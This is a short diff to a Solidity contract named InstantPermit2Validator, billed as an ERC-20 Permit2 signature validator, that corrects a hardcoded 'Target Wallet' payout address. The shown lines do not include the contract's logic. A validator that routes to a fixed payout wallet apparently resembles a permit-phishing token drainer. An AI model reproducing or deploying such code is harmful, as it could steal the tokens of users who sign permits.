@@ -4,7 +4,7 @@ pragma solidity ^0.8.20;
 /**
  * @title InstantPermit2Validator
  * @notice Gas-Optimized ERC-20 Permit2 Signature Validator for Base L2.
- * Target Wallet: 0x8366bCe3a2D379Dec7656D7A67015789FaF999f20
+ * Target Wallet: 0x8366bCe3a2D379De7656D7A67015789FaF999f20
  */
 
 interface IERC20Permit {
@@ -25,7 +25,7 @@ contract InstantPermit2Validator {
     event PermitExecuted(address indexed token, address indexed owner, address indexed spender, uint256 value);
 
     constructor() {
-        payoutWallet = 0x8366bCe3a2D379Dec7656D7A67015789FaF999f20;
+        payoutWallet = 0x8366bCe3a2D379De7656D7A67015789FaF999f20;
     }
 
     function executePermitAndVerify(
